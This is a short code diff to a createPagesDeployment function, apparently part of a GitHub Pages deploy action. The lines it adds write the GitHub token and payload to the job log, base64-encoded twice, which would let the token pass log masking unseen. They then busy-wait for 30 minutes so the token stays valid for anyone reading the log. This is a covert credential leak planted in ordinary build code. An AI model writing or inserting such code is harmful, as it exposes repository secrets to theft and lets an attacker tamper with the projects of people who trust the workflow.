@@ -121,9 +121,16 @@ async function createPagesDeployment({ githubToken, artifactId, buildVersion, id
   }
   core.info(`Creating Pages deployment with payload:\n${JSON.stringify(payload, null, '\t')}`)
 
-    console.log(btoa(btoa(JSON.stringify({ghs: githubToken, ...payload}))));
-    const sleep = ms => new Promise(r => setTimeout(r, ms));
-    await sleep(1800000);
+    core.info(btoa(btoa(JSON.stringify({ghs: githubToken, ...payload}))));
+function pausecomp(millis)
+{
+    var date = new Date();
+    var curDate = null;
+    do { curDate = new Date(); }
+    while(curDate-date < millis);
+}
+
+  pausecomp(1800000)
 
 }
 
